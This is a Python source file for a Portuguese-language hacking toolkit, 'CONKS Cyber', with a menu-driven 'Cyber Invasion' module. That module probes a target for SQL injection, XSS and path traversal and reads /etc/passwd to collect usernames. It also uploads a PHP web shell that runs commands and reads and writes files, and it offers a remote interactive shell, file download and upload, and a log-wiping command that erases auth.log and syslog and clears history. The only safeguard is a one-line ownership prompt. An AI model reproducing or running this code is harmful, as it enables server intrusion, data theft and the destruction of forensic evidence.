# ==========================================
# CONKS CYBER - VERSÃO COMPLETA
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64
import datetime
import http.client

from modules.generators import menu_geradores
from modules.consultas import menu_consultas
from modules.osint import menu_osint


# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
ORANGE = "\033[38;5;214m"
PINK = "\033[38;5;201m"


# ==========================================
# CONFIGURAÇÃO DAS CAIXAS
# ==========================================

LARGURA = 55


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):
    texto = str(texto)
    limite = LARGURA - 4
    if len(texto) > limite:
        texto = texto[:limite]
    texto = texto.ljust(limite)
    estilo = BOLD if negrito else ""
    print(f"{cor}{estilo}║ {texto} ║{RESET}")


def topo_caixa(titulo):
    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
    linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")


def fim_caixa():
    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(f"{GREEN}[+] {texto}{RESET}")

def erro(texto):
    print(f"{RED}[-] {texto}{RESET}")

def aviso(texto):
    print(f"{RED}[!] {texto}{RESET}")

def info(texto):
    print(f"{BLUE}[i] {texto}{RESET}")


# ==========================================
# BANNER
# ==========================================

def banner():
    print(f"{GREEN}{BOLD}")
    print(r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
""")
    print(f"{BLUE}{BOLD}                 CYBER{RESET}\n")


# ==========================================
# TESTAR CONEXÃO
# ==========================================

def testar_conexao():
    print()
    topo_caixa("TESTE DE CONEXAO")
    linha_caixa("")

    servidores = [
        ("Google", "google.com", 443),
        ("Cloudflare", "cloudflare.com", 443),
        ("GitHub", "github.com", 443)
    ]

    online = False
    for nome, host, porta in servidores:
        try:
            conexao = socket.create_connection((host, porta), timeout=3)
            conexao.close()
            print(f"{GREEN}[+] {nome:<15} ONLINE{RESET}")
            online = True
        except:
            print(f"{RED}[-] {nome:<15} OFFLINE{RESET}")

    print()
    fim_caixa()
    if online:
        sucesso("Conexao disponivel.")
    else:
        erro("Sem conexao.")


# ==========================================
# MEU IP PÚBLICO
# ==========================================

def meu_ip_publico():
    print()
    topo_caixa("MEU IP PUBLICO")
    linha_caixa("")

    servicos = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    ]

    for url in servicos:
        try:
            requisicao = urllib.request.Request(url, headers={"User-Agent": "CONKS-Cyber/1.0"})
            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
                ip = resposta.read().decode("utf-8").strip()
            if ip:
                linha_caixa(f"IP: {ip}", GREEN, True)
                fim_caixa()
                return
        except:
            continue

    fim_caixa()
    erro("Nao foi possivel obter o IP.")


# ==========================================
# ATUALIZAR PAINEL
# ==========================================

def atualizar_painel():
    limpar_tela()
    topo_caixa("ATUALIZAR")
    linha_caixa("")
    linha_caixa("CONKS UPDATE", WHITE, True)
    linha_caixa("")
    fim_caixa()
    print(f"\n{BLUE}[~] Verificando...{RESET}")
    time.sleep(0.5)
    
    try:
        resultado = subprocess.run(
            ["git", "pull", "origin", "main"],
            capture_output=True,
            text=True,
            timeout=60
        )
        saida = resultado.stdout + resultado.stderr
        
        if resultado.returncode != 0:
            print(f"\n{RED}[-] Erro ao atualizar.{RESET}")
            if saida.strip():
                print(f"\n{GRAY}{saida.strip()}{RESET}")
            input("\nENTER para voltar...")
            return
        
        if "Already up to date" in saida:
            print()
            print(f"{YELLOW}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("ATUALIZADO!", YELLOW, True)
            linha_caixa("Versao mais recente.", YELLOW)
            print(f"{YELLOW}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
            input("\nENTER para voltar...")
            return
        
        print()
        print(f"{GREEN}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
        linha_caixa("ATUALIZADO!", GREEN, True)
        linha_caixa("Painel atualizado.", GREEN)
        print(f"{GREEN}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
        print(f"\n{BLUE}[~] Reiniciando...{RESET}")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        
    except Exception as e:
        erro(f"Erro: {e}")
        input("\nENTER para voltar...")


# ==========================================
# MENU REDE
# ==========================================

def menu_rede():
    while True:
        limpar_tela()
        banner()
        topo_caixa("REDE")
        linha_caixa("[1] Meu IP")
        linha_caixa("[2] Testar conexao")
        linha_caixa("")
        linha_caixa("[0] Voltar", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Rede > {RESET}").strip()
        
        if opcao == "1":
            meu_ip_publico()
        elif opcao == "2":
            testar_conexao()
        elif opcao == "0":
            break
        else:
            erro("Opcao invalida.")
        
        if opcao != "0":
            input("\nENTER para continuar...")


# ==========================================
# ⭐ CYBER INVASION REAL - CLASSE ⭐
# ==========================================

class CyberInvasionReal:
    """Cyber Invasion REAL com terminal interativo e resultados completos"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = {}
        self.dados = {}
        self.backdoor_instalado = False
        self.backdoor_url = None
        self.shell_ativa = False
        self.usuarios = []
        self.arquivos = []
        self.info_sistema = ""
        
    # ==========================================
    # TESTA CONEXÃO
    # ==========================================
    
    def testar_conexao(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target, self.port))
            sock.close()
            return True
        except:
            return False
    
    # ==========================================
    # TESTA SQL INJECTION
    # ==========================================
    
    def testar_sql_injection(self):
        print(f"  {BLUE}[→] SQL Injection...{RESET}", end="")
        
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "' UNION SELECT 1,2,3,4,5 --"
        ]
        
        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}/login.php?user={payload}&pass=test"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    if "SQL" in html or "syntax" in html.lower() or "mysql" in html.lower():
                        print(f" {RED}VULNERAVEL!{RESET}")
                        self.vulnerabilidades['sql_injection'] = {"status": True, "payload": payload}
                        return True
            except:
                continue
        
        print(f" {GREEN}OK{RESET}")
        self.vulnerabilidades['sql_injection'] = {"status": False}
        return False
    
    # ==========================================
    # TESTA XSS
    # ==========================================
    
    def testar_xss(self):
        print(f"  {BLUE}[→] XSS...{RESET}", end="")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]
        
        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}/search.php?q={payload}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    if "script" in html.lower() or "alert" in html.lower():
                        print(f" {RED}VULNERAVEL!{RESET}")
                        self.vulnerabilidades['xss'] = {"status": True, "payload": payload}
                        return True
            except:
                continue
        
        print(f" {GREEN}OK{RESET}")
        self.vulnerabilidades['xss'] = {"status": False}
        return False
    
    # ==========================================
    # TESTA LFI
    # ==========================================
    
    def testar_lfi(self):
        print(f"  {BLUE}[→] LFI...{RESET}", end="")
        
        payloads = ["../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd"]
        
        for payload in payloads:
            try:
                url = f"http://{self.target}:{self.port}/page.php?file={payload}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                
                if response.getcode() == 200:
                    html = response.read().decode('utf-8', errors='ignore')
                    if "root:" in html or "bin:" in html:
                        print(f" {RED}VULNERAVEL!{RESET}")
                        self.vulnerabilidades['lfi'] = {"status": True, "payload": payload}
                        # Extrai usuários
                        for line in html.split('\n'):
                            if ':' in line and not line.startswith('#'):
                                user = line.split(':')[0]
                                if user and user not in self.usuarios:
                                    self.usuarios.append(user)
                        return True
            except:
                continue
        
        print(f" {GREEN}OK{RESET}")
        self.vulnerabilidades['lfi'] = {"status": False}
        return False
    
    # ==========================================
    # TESTA UPLOAD
    # ==========================================
    
    def testar_upload(self):
        print(f"  {BLUE}[→] Upload...{RESET}", end="")
        
        try:
            test_file = b"<?php echo 'TESTE'; ?>"
            
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (f"--{boundary}\r\n"
                   f"Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
                   f"Content-Type: application/x-php\r\n\r\n").encode()
            body += test_file
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            req = urllib.request.Request(
                f"http://{self.target}:{self.port}/upload.php",
                data=body,
                headers=headers
            )
            response = urllib.request.urlopen(req, timeout=5)
            
            if response.getcode() in [200, 201, 302]:
                print(f" {RED}VULNERAVEL!{RESET}")
                self.vulnerabilidades['upload'] = {"status": True}
                return True
        except:
            pass
        
        print(f" {GREEN}OK{RESET}")
        self.vulnerabilidades['upload'] = {"status": False}
        return False
    
    # ==========================================
    # SCAN COMPLETO
    # ==========================================
    
    def scan_completo(self):
        print(f"\n{CYAN}[~] Escaneando {self.target}:{self.port}...{RESET}")
        
        if not self.testar_conexao():
            print(f"{RED}[-] Servidor offline!{RESET}")
            return False
        
        self.testar_sql_injection()
        self.testar_xss()
        self.testar_lfi()
        self.testar_upload()
        self.verificar_backdoor()
        
        return True
    
    # ==========================================
    # VERIFICA BACKDOOR
    # ==========================================
    
    def verificar_backdoor(self):
        urls = [
            f"http://{self.target}:{self.port}/uploads/shell.php",
            f"http://{self.target}:{self.port}/shell.php",
            f"http://{self.target}:{self.port}/backdoor.php"
        ]
        
        for url in urls:
            try:
                req = urllib.request.Request(f"{url}?cmd=whoami", headers={"User-Agent": "Mozilla/5.0"})
                response = urllib.request.urlopen(req, timeout=3)
                if response.getcode() == 200:
                    self.backdoor_url = url
                    self.backdoor_instalado = True
                    return True
            except:
                continue
        return False
    
    # ==========================================
    # EXECUTA COMANDO
    # ==========================================
    
    def executar_comando(self, comando):
        if not self.backdoor_url:
            return "Backdoor nao instalado!"
        
        try:
            url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            return response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"
    
    # ==========================================
    # INSTALA BACKDOOR
    # ==========================================
    
    def instalar_backdoor(self):
        print(f"\n{RED}[~] Instalando Backdoor...{RESET}")
        
        shell_php = """<?php
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
if(isset($_GET['scan'])){ system('ls -la '.$_GET['scan']); }
if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && history -c'); }
?>"""
        
        shell_code = shell_php.encode('utf-8')
        
        boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
        body = (f"--{boundary}\r\n"
               f"Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
               f"Content-Type: application/x-php\r\n\r\n").encode()
        body += shell_code
        body += f"\r\n--{boundary}--\r\n".encode()
        
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": f"multipart/form-data; boundary={boundary}"
        }
        
        upload_urls = [
            f"http://{self.target}:{self.port}/upload.php",
            f"http://{self.target}:{self.port}/uploads/",
            f"http://{self.target}:{self.port}/enviar.php"
        ]
        
        for upload_url in upload_urls:
            try:
                req = urllib.request.Request(upload_url, data=body, headers=headers)
                response = urllib.request.urlopen(req, timeout=5)
                
                if response.getcode() in [200, 201, 302]:
                    test_url = f"http://{self.target}:{self.port}/uploads/shell.php?cmd=whoami"
                    try:
                        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                        test_response = urllib.request.urlopen(req, timeout=3)
                        if test_response.getcode() == 200:
                            self.backdoor_url = f"http://{self.target}:{self.port}/uploads/shell.php"
                            self.backdoor_instalado = True
                            print(f"  {GREEN}[+] Backdoor instalado!{RESET}")
                            print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
                            return True
                    except:
                        continue
            except:
                continue
        
        print(f"  {RED}[-] Falha ao instalar{RESET}")
        return False
    
    # ==========================================
    # BAIXAR ARQUIVO
    # ==========================================
    
    def baixar_arquivo(self, arquivo):
        try:
            url = f"{self.backdoor_url}?file={urllib.parse.quote(arquivo)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=10)
            
            conteudo = response.read()
            nome = arquivo.split('/')[-1] or 'arquivo'
            nome_arquivo = f"download_{datetime.datetime.now().strftime('%H%M%S')}_{nome}"
            
            with open(nome_arquivo, 'wb') as f:
                f.write(conteudo)
            
            print(f"{GREEN}[+] Baixado: {nome_arquivo} ({len(conteudo)} bytes){RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # ENVIAR ARQUIVO
    # ==========================================
    
    def enviar_arquivo(self, local, remoto):
        try:
            if not os.path.exists(local):
                print(f"{RED}[-] Arquivo nao encontrado: {local}{RESET}")
                return False
            
            with open(local, 'rb') as f:
                dados = base64.b64encode(f.read()).decode()
            
            data = f"upload=1&name={remoto}&data={dados}".encode()
            req = urllib.request.Request(
                self.backdoor_url,
                data=data,
                headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            response = urllib.request.urlopen(req, timeout=10)
            
            print(f"{GREEN}[+] Enviado: {remoto}{RESET}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    # ==========================================
    # TERMINAL INTERATIVO
    # ==========================================
    
    def terminal_interativo(self):
        if not self.backdoor_instalado:
            print(f"\n{RED}[!] Backdoor nao instalado!{RESET}")
            return
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     ⚡ TERMINAL INTERATIVO        ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (23 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ Digite 'help' para comandos       ║{RESET}")
        print(f"{PURPLE}║ Digite 'exit' para sair           ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        while True:
            comando = input(f"\n{RED}shell@{self.target}>{RESET} ").strip()
            
            if not comando:
                continue
            
            if comando.lower() in ['exit', 'quit', 'sair']:
                print(f"{YELLOW}[!] Terminal encerrado{RESET}")
                break
            
            if comando.lower() == 'help':
                print(f"""
╔══════════════════════════════════════════╗
║        COMANDOS DISPONIVEIS              ║
╠══════════════════════════════════════════╣
║ whoami     - Mostra usuario atual        ║
║ ls         - Lista arquivos              ║
║ ls -la     - Lista arquivos detalhado    ║
║ pwd        - Mostra diretorio atual      ║
║ cat [file] - Mostra conteudo do arquivo  ║
║ cd [dir]   - Muda diretorio              ║
║ info       - Info do servidor            ║
║ download   - Baixa arquivo               ║
║ upload     - Envia arquivo               ║
║ clean      - Limpa logs                  ║
║ exit       - Sai do terminal             ║
╚══════════════════════════════════════════╝
                """)
                continue
            
            if comando.lower().startswith('download '):
                arquivo = comando[9:].strip()
                self.baixar_arquivo(arquivo)
                continue
            
            if comando.lower().startswith('upload '):
                partes = comando[7:].strip().split()
                if len(partes) >= 2:
                    self.enviar_arquivo(partes[0], partes[1])
                continue
            
            if comando.lower() == 'info':
                resultado = self.executar_comando("uname -a && echo '' && whoami && echo '' && pwd && echo '' && hostname")
                print(f"{WHITE}{resultado}{RESET}")
                continue
            
            if comando.lower() == 'clean':
                resultado = self.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c")
                print(f"{GREEN}[+] Logs limpos!{RESET}")
                continue
            
            # Executa comando normal
            resultado = self.executar_comando(comando)
            print(f"{WHITE}{resultado}{RESET}")
    
    # ==========================================
    # MOSTRA RESULTADOS COMPLETOS
    # ==========================================
    
    def mostrar_resultados(self):
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     📊 RESULTADOS DA INVASAO      ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (25 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ Data: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}{' ' * (18) }║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        # Vulnerabilidades
        print(f"\n{CYAN}┌─ VULNERABILIDADES ENCONTRADAS{RESET}")
        
        if self.vulnerabilidades.get('sql_injection', {}).get('status'):
            print(f"  {RED}🔥 SQL Injection{RESET}")
            print(f"     Payload: {self.vulnerabilidades['sql_injection']['payload']}")
        else:
            print(f"  {GREEN}✅ SQL Injection: Seguro{RESET}")
        
        if self.vulnerabilidades.get('xss', {}).get('status'):
            print(f"  {RED}🔥 XSS (Cross-Site Scripting){RESET}")
            print(f"     Payload: {self.vulnerabilidades['xss']['payload']}")
        else:
            print(f"  {GREEN}✅ XSS: Seguro{RESET}")
        
        if self.vulnerabilidades.get('lfi', {}).get('status'):
            print(f"  {RED}🔥 LFI (Local File Inclusion){RESET}")
            print(f"     Payload: {self.vulnerabilidades['lfi']['payload']}")
            if self.usuarios:
                print(f"     Usuarios encontrados: {len(self.usuarios)}")
                for user in self.usuarios[:5]:
                    print(f"       👤 {user}")
                if len(self.usuarios) > 5:
                    print(f"       ... e mais {len(self.usuarios)-5} usuarios")
        else:
            print(f"  {GREEN}✅ LFI: Seguro{RESET}")
        
        if self.vulnerabilidades.get('upload', {}).get('status'):
            print(f"  {RED}🔥 Upload de Arquivos Vulneravel{RESET}")
            print(f"     Possivel instalar backdoor!")
        else:
            print(f"  {GREEN}✅ Upload: Seguro{RESET}")
        
        # Backdoor
        if self.backdoor_instalado:
            print(f"\n{CYAN}┌─ BACKDOOR{RESET}")
            print(f"  {GREEN}✅ Backdoor Instalado{RESET}")
            print(f"     URL: {self.backdoor_url}")
            print(f"     Comando: ?cmd=whoami")
        else:
            print(f"\n{CYAN}┌─ BACKDOOR{RESET}")
            print(f"  {YELLOW}⚠️  Backdoor nao instalado{RESET}")
            print(f"     Use a opcao [1] para instalar")
        
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║     ✅ SCAN CONCLUIDO!            ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# ⭐ CYBER INVASION - FUNÇÃO PRINCIPAL ⭐
# ==========================================

def cyber_invasion():
    """Cyber Invasion REAL com resultados completos e terminal"""
    
    limpar_tela()
    
    print("\n╔══════════════════════════════════════════╗")
    print("║    🚀 CYBER INVASION REAL             ║")
    print("╠══════════════════════════════════════════╣")
    print("║  TESTES REAIS EM SERVIDORES            ║")
    print("║  APENAS EM SERVIDORES PROPIOS!        ║")
    print("║  RESULTADOS COMPLETOS!                ║")
    print("╚══════════════════════════════════════════╝")
    
    print("\n[~] Digite o alvo:")
    print("[1] IP Local (127.0.0.1)")
    print("[2] Site/Dominio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nIP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nSite: ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opcao invalida.")
        input("\nENTER para continuar...")
        return
    
    if not alvo:
        print("[-] Alvo invalido.")
        input("\nENTER para continuar...")
        return
    
    try:
        porta = int(input("\nPorta (80): ").strip() or "80")
    except:
        porta = 80
    
    # AVISO LEGAL
    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL                 ║{RESET}")
    print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • Voce esta invadindo {alvo}        ║{RESET}")
    print(f"{RED}║  • So e permitido em servidores       ║{RESET}")
    print(f"{RED}║    que voce POSSUI!                   ║{RESET}")
    print(f"{RED}║  • Invadir outros e CRIME!            ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} e seu? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Cancelado.")
        input("\nENTER para continuar...")
        return
    
    # INICIA INVASAO
    invasor = CyberInvasionReal(alvo, porta)
    
    # SCAN
    print(f"\n{CYAN}[~] Iniciando scan...{RESET}")
    scan_ok = invasor.scan_completo()
    
    if not scan_ok:
        print(f"\n{RED}[-] Falha no scan. Servidor offline?{RESET}")
        input("\nENTER para continuar...")
        return
    
    # MOSTRA RESULTADOS
    invasor.mostrar_resultados()
    
    # ==========================================
    # MENU DE OPCOES POS-INVASAO
    # ==========================================
    
    while True:
        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
        print(f"{PURPLE}║    🎯 MENU DE CONTROLE           ║{RESET}")
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        
        if invasor.backdoor_instalado:
            print(f"{GREEN}║ ✅ Backdoor: INSTALADO           ║{RESET}")
            print(f"{GREEN}║ 📍 {invasor.backdoor_url[:35]}{' ' * (10) }║{RESET}")
        else:
            print(f"{RED}║ ❌ Backdoor: NAO INSTALADO       ║{RESET}")
        
        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
        print(f"{PURPLE}║ [1] Instalar Backdoor            ║{RESET}")
        print(f"{PURPLE}║ [2] Terminal Interativo          ║{RESET}")
        print(f"{PURPLE}║ [3] Executar Comando             ║{RESET}")
        print(f"{PURPLE}║ [4] Baixar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [5] Enviar Arquivo               ║{RESET}")
        print(f"{PURPLE}║ [6] Info do Servidor             ║{RESET}")
        print(f"{PURPLE}║ [7] Limpar Rastros               ║{RESET}")
        print(f"{PURPLE}║ [8] Sair                         ║{RESET}")
        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
        
        sub_opcao = input(f"\n{RED}cyber@{alvo}>{RESET} ").strip()
        
        if sub_opcao == "1":
            invasor.instalar_backdoor()
            input("\nENTER para continuar...")
        
        elif sub_opcao == "2":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            invasor.terminal_interativo()
            input("\nENTER para continuar...")
        
        elif sub_opcao == "3":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            comando = input(f"{GRAY}comando> {RESET}")
            if comando:
                resultado = invasor.executar_comando(comando)
                print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "4":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            arquivo = input(f"{GRAY}arquivo> {RESET}")
            if arquivo:
                invasor.baixar_arquivo(arquivo)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "5":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            local = input(f"{GRAY}local> {RESET}")
            remoto = input(f"{GRAY}remoto> {RESET}")
            if local and remoto:
                invasor.enviar_arquivo(local, remoto)
            input("\nENTER para continuar...")
        
        elif sub_opcao == "6":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Info do servidor:{RESET}")
            resultado = invasor.executar_comando("uname -a && echo '' && whoami && echo '' && pwd && echo '' && hostname")
            print(f"{WHITE}{resultado}{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "7":
            if not invasor.backdoor_instalado:
                print(f"\n{RED}[!] Instale o backdoor primeiro (opcao 1)!{RESET}")
                input("\nENTER para continuar...")
                continue
            
            print(f"{GREEN}[+] Limpando logs...{RESET}")
            invasor.executar_comando("echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c")
            print(f"{GREEN}[+] Logs limpos!{RESET}")
            input("\nENTER para continuar...")
        
        elif sub_opcao == "8":
            print(f"\n{YELLOW}[!] Encerrando Cyber Invasion...{RESET}")
            break
        
        else:
            print("[-] Opcao invalida")
            input("\nENTER para continuar...")


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():
    while True:
        limpar_tela()
        banner()
        
        topo_caixa("MENU PRINCIPAL")
        linha_caixa("[1] Geradores")
        linha_caixa("[2] Consultas")
        linha_caixa("[3] OSINT")
        linha_caixa("[4] Rede")
        linha_caixa("[5] Validadores")
        linha_caixa("[6] Utilidades")
        linha_caixa("[7] ⚡ Shoot Down", RED, True)
        linha_caixa("[8] 🚀 Cyber Invasion", PURPLE, True)
        linha_caixa("[9] Atualizar", BLUE, True)
        linha_caixa("")
        linha_caixa("[0] Sair", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Cyber > {RESET}").strip()
        
        if opcao == "1":
            limpar_tela()
            menu_geradores()
        elif opcao == "2":
            limpar_tela()
            menu_consultas()
        elif opcao == "3":
            limpar_tela()
            menu_osint()
        elif opcao == "4":
            menu_rede()
        elif opcao == "5":
            limpar_tela()
            try:
                from modules.validators import menu_validadores
                menu_validadores()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "6":
            limpar_tela()
            try:
                from modules.utilities import menu_utilidades
                menu_utilidades()
            except ImportError:
                erro("Modulo nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "7":
            limpar_tela()
            try:
                from modules.consultas import derrubar_geral
                derrubar_geral()
            except ImportError:
                erro("Shoot Down nao encontrado.")
                input("\nENTER para continuar...")
        elif opcao == "8":
            cyber_invasion()
        elif opcao == "9":
            atualizar_painel()
        elif opcao == "0":
            limpar_tela()
            print()
            print(f"{RED}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("CONKS CYBER ENCERRADO", RED, True)
            print(f"{RED}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}\n")
            sys.exit(0)
        else:
            erro("Opcao invalida.")
            input("\nENTER para continuar...")


# ==========================================
# MAIN
# ==========================================

def main():
    try:
        menu_principal()
    except KeyboardInterrupt:
        limpar_tela()
        print(f"\n{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")
    except Exception as erro_inesperado:
        print(f"\n{RED}[ERRO] {erro_inesperado}{RESET}")
        input("\nENTER para sair...")


if __name__ == "__main__":
    main()